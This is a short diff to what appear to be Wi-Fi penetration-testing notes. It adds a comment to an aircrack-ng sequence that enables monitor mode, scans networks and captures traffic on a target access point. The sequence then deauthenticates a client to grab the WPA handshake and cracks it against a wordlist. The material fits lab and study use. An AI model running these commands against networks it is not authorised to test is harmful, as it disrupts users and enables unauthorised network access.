@@ -32,8 +32,8 @@ iwconfig
 airmon-ng check kill
 airmon-ng start wlan0 -> place network card into monitor mode
 iwconfig -> to make sure you are in monitor mode
-airodump-ng wlan0mon
-airodump-ng -c <channel_number> --bssid <MAC_Address> -w capture wlan0mon
+airodump-ng wlan0mon -> discover wireless networks
+airodump-ng -c <channel_number> --bssid <MAC_Address> -w capture wlan0mon 
 aireplay-ng -0 1 -a <MAC_Address> -c <client_we_deauth> wlan0mon -> at the end of this, we aim to gather handshake
 ls capture* -> we should see all the captured data with the extension of csv, cap, netxml, kismet.csv
 We will use .cap file in order to crack/recover the handshake against a wordlist.
